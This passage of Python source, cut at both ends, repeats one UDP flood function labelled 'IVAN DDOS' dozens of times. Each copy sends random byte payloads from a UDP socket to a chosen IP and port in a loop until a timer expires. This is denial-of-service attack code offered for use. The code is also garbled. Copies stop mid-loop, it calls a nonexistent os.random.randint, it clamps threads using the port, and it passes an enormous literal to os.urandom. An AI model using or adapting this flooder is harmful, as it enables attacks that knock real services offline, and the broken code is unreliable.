        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
